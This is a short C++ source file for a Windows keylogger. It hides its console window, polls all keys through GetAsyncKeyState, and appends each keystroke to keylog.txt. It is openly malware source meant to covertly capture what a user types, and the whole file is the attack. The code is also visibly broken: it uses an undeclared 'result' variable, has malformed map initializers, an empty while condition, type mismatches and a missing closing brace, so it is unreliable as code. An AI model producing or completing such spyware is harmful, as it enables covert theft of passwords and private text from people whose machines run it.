#include <iostream>
#include<map>
#include <fstream>
#include <Windows.h>
#include <string>
#include <bits/stdc++.h>

using namespace std;
#define LOG_FILE "keylog.txt"

void saveData(string data) {
    fstream file;

    file.open(LOG_FILE, ios::app);

    file << data;

    file.close();
}

int main() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
std::map<int, std::string> specialKeys{
        {result[VK_SPACE] = " "},
        {result[VK_RETURN] = "\n"},
        {result[VK_BACK] = "\b"},
        {result[VK_TAB] = "[TAB]"},
        {result[VK_SHIFT] = "[SHIFT]"},
        {result[VK_CONTROL] = "[CTRL]"},
        {result[VK_MENU] = "[ALT]"},
        {result[VK_CAPITAL] = "[CAPS_LOCK]"}
    };


    while () {
        for (int i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) & 0x8001) {
                if (find(specialKeys.begin(), specialKeys.end(), i) != specialKeys.end()) {
                    saveData(specialKeys.at(i));
                } else {
                    saveData(char(i));
                }
            }
        }
    
}